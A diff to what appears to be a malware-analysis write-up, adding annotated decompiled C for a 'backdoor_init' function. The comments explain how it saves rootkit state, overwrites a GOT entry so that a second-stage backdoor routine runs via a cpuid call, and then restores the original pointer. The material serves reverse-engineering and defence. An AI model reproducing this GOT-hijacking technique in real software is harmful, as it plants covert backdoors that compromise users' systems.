@@ -72,3 +72,41 @@ __int64 check_software_breakpoint(_DWORD *code_addr, __int64 a2, int a3)
   return v4;
 }
 ```
+
+----
+Function backdoor_init (0xA784
+
+```c
+__int64 backdoor_init(rootkit_ctx *ctx, DWORD *prev_got_ptr)
+{
+  _DWORD *v2;
+  __int64 runtime_offset;
+  bool is_cpuid_got_zero;
+  void *cpuid_got_ptr;
+  __int64 got_value;
+  _QWORD *cpuid_got_ptr_1;
+
+  ctx->self = ctx;
+  // store rootkit data before overwrite
+  rootkit_ctx_save(ctx);
+  ctx->prev_got_ptr = ctx->got_ptr;
+  runtime_offset = ctx->head - ctx->self;
+  ctx->runtime_offset = runtime_offset;
+  is_cpuid_got_zero = (char *)*(&Llzma_block_buffer_decode_0 + 1) + runtime_offset == 0LL;
+  cpuid_got_ptr = (char *)*(&Llzma_block_buffer_decode_0 + 1) + runtime_offset;
+  ctx->got_ptr = cpuid_got_ptr;
+  if ( !is_cpuid_got_zero )
+  {
+    cpuid_got_ptr_1 = cpuid_got_ptr;
+    got_value = *(QWORD *)cpuid_got_ptr;
+    // replace with Llzma_delta_props_encoder (backdoor_init_stage2)
+    *(QWORD *)cpuid_got_ptr = (char *)*(&Llzma_block_buffer_decode_0 + 2) + runtime_offset;
+    // this calls Llzma_delta_props_encoder due to the GOT overwrite
+    runtime_offset = cpuid((unsigned int)ctx, prev_got_ptr, cpuid_got_ptr, &Llzma_block_buffer_decode_0, v2);
+    // restore original
+    *cpuid_got_ptr_1 = got_value;
+  }
+  return runtime_offset;
+}
+```
+----
